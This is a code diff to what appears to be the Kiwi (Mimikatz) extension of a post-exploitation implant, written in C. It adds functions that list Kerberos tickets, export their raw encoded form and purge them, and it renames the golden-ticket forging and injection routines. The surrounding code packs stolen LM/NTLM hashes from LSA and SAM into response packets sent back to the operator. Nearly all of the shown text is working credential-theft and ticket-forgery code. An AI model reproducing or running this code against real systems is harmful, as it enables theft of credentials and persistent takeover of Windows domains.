@@ -9,8 +9,10 @@
 #define SHA_DIGEST_LENGTH	20
 // copied from globals
 #define LM_NTLM_HASH_LENGTH	16
+#define TIME_SIZE 28
 
 #include "modules\kuhl_m_lsadump_struct.h"
+#include "modules\kerberos\khul_m_kerberos_struct.h"
 
 typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
 typedef LONG (* PKUHL_M_SEKURLSA_ENUMERATOR)(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
@@ -23,13 +25,10 @@ extern LONG kuhl_m_sekurlsa_tspkg_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOI
 extern LONG kuhl_m_sekurlsa_livessp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
 extern LONG kuhl_m_sekurlsa_ssp_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
 extern LONG kuhl_m_lsadump_full(PLSA_CALLBACK_CTX callbackCtx);
-
-// TODO:
-//extern LONG kuhl_m_sekurlsa_tickets_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
-//extern LONG kuhl_m_sekurlsa_dpapi_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state);
-
+extern LONG kuhl_m_kerberos_list_tickets(PKERB_CALLBACK_CTX callbackCtx, BOOL bExport);
 extern LONG kuhl_m_kerberos_use_ticket(PBYTE fileData, DWORD fileSize);
 extern LONG kuhl_m_kerberos_create_golden_ticket(PCWCHAR szUser, PCWCHAR szDomain, PCWCHAR szSid, PCWCHAR szNtlm, PBYTE* ticketBuffer, DWORD* ticketBufferSize);
+extern LONG kuhl_m_kerberos_purge_ticket();
 
 BOOL is_unicode_string(DWORD dwBytes, LPVOID pSecret)
 {
@@ -175,7 +174,102 @@ wchar_t* ascii_to_wide_string(char* ascii)
 	return buffer;
 }
 
-DWORD mimikatz_golden_ticket_create(char* user, char* domain, char* sid, char* tgt, Packet* response)
+VOID to_system_time_string(LARGE_INTEGER time, char output[TIME_SIZE])
+{
+	SYSTEMTIME st;
+	PFILETIME pTime = (PFILETIME)&time;
+
+	ZeroMemory(output, TIME_SIZE);
+	
+	FileTimeToSystemTime(pTime, &st);
+	sprintf_s(output, TIME_SIZE, "%4u-%02u-%02u %02u:%02u:%02u.%03u",
+		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
+}
+
+VOID TicketHandler(LPVOID lpContext, PKERB_TICKET_CACHE_INFO_EX pKerbTicketInfo, PKERB_EXTERNAL_TICKET pExternalTicket)
+{
+	Packet* packet = (Packet*)lpContext;
+
+	Tlv entries[10];
+	DWORD dwCount = 0;
+	UINT uEncType = htonl(pKerbTicketInfo->EncryptionType);
+	UINT uFlags = htonl(pKerbTicketInfo->TicketFlags);
+	char sStart[TIME_SIZE], sEnd[TIME_SIZE], sMaxRenew[TIME_SIZE];
+
+	dprintf("[KIWI KERB] Adding ticket to result");
+
+	dprintf("[KIWI KERB] Converting times");
+	to_system_time_string(pKerbTicketInfo->StartTime, sStart);
+	to_system_time_string(pKerbTicketInfo->EndTime, sEnd);
+	to_system_time_string(pKerbTicketInfo->RenewTime, sMaxRenew);
+
+	dprintf("[KIWI KERB] Adding enc type");
+	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_ENCTYPE;
+	entries[dwCount].header.length = sizeof(UINT);
+	entries[dwCount].buffer = (PUCHAR)&uEncType;
+	++dwCount;
+
+	dprintf("[KIWI KERB] Adding flags");
+	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_FLAGS;
+	entries[dwCount].header.length = sizeof(UINT);
+	entries[dwCount].buffer = (PUCHAR)&uFlags;
+	++dwCount;
+
+	dprintf("[KIWI KERB] Adding start time");
+	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_START;
+	entries[dwCount].header.length = (DWORD)strlen(sStart);
+	entries[dwCount].buffer = (PUCHAR)sStart;
+	++dwCount;
+
+	dprintf("[KIWI KERB] Adding end time");
+	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_END;
+	entries[dwCount].header.length = (DWORD)strlen(sEnd);
+	entries[dwCount].buffer = (PUCHAR)sEnd;
+	++dwCount;
+
+	dprintf("[KIWI KERB] Adding max renew time");
+	entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_MAXRENEW;
+	entries[dwCount].header.length = (DWORD)strlen(sMaxRenew);
+	entries[dwCount].buffer = (PUCHAR)sMaxRenew;
+	++dwCount;
+
+	dprintf("[KIWI KERB] Adding server name");
+	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERNAME, pKerbTicketInfo->ServerName.Buffer, pKerbTicketInfo->ServerName.Length / sizeof(wchar_t));
+	dprintf("[KIWI KERB] Adding server realm");
+	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_SERVERREALM, pKerbTicketInfo->ServerRealm.Buffer, pKerbTicketInfo->ServerRealm.Length / sizeof(wchar_t));
+	dprintf("[KIWI KERB] Adding client name");
+	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME, pKerbTicketInfo->ClientName.Buffer, pKerbTicketInfo->ClientName.Length / sizeof(wchar_t));
+	dprintf("[KIWI KERB] Adding client realm");
+	packet_add_tlv_wstring_entry(&entries[dwCount++], TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM, pKerbTicketInfo->ClientRealm.Buffer, pKerbTicketInfo->ClientRealm.Length / sizeof(wchar_t));
+
+	if (pExternalTicket)
+	{
+		dprintf("[KIWI KERB] Adding raw ticket");
+		entries[dwCount].header.type = TLV_TYPE_KIWI_KERB_TKT_RAW;
+		entries[dwCount].header.length = pExternalTicket->EncodedTicketSize;
+		entries[dwCount].buffer = pExternalTicket->EncodedTicket;
+		++dwCount;
+	}
+
+	packet_add_tlv_group(packet, TLV_TYPE_KIWI_KERB_TKT, entries, dwCount);
+}
+
+DWORD mimikatz_kerberos_ticket_list(BOOL bExport, Packet* response)
+{
+	KERB_CALLBACK_CTX callbackCtx;
+
+	callbackCtx.lpContext = response;
+	callbackCtx.pTicketHandler = TicketHandler;
+
+	return kuhl_m_kerberos_list_tickets(&callbackCtx, bExport);
+}
+
+DWORD mimikatz_kerberos_ticket_purge()
+{
+	return kuhl_m_kerberos_purge_ticket();
+}
+
+DWORD mimikatz_kerberos_golden_ticket_create(char* user, char* domain, char* sid, char* tgt, Packet* response)
 {
 	DWORD result = 0;
 	BYTE* ticketBuffer;
@@ -199,7 +293,7 @@ DWORD mimikatz_golden_ticket_create(char* user, char* domain, char* sid, char* t
 			break;
 		}
 
-		packet_add_tlv_raw(response, TLV_TYPE_KIWI_GOLD_TICKET, ticketBuffer, ticketBufferSize);
+		packet_add_tlv_raw(response, TLV_TYPE_KIWI_KERB_TKT_RAW, ticketBuffer, ticketBufferSize);
 	} while (0);
 
 	if (wUser)
@@ -222,7 +316,7 @@ DWORD mimikatz_golden_ticket_create(char* user, char* domain, char* sid, char* t
 	return result;
 }
 
-DWORD mimikatz_golden_ticket_use(BYTE* buffer, DWORD bufferSize)
+DWORD mimikatz_kerberos_ticket_use(BYTE* buffer, DWORD bufferSize)
 {
 	return kuhl_m_kerberos_use_ticket(buffer, bufferSize);
 }
@@ -361,7 +455,7 @@ VOID SamHashHandler(LPVOID lpContext, DWORD dwRid, wchar_t* lpwUser, DWORD dwUse
 	Packet *response = (Packet*)lpContext;
 	dprintf("[KIWI SAM] HERE!");
 
-	if (hasLmHash || hasNtlmHash)
+	if ((hasLmHash || hasNtlmHash) && lpwUser)
 	{
 		dprintf("[KIWI SAM] Adding %S rid %u (%x)", lpwUser, dwRid, dwRid);
 
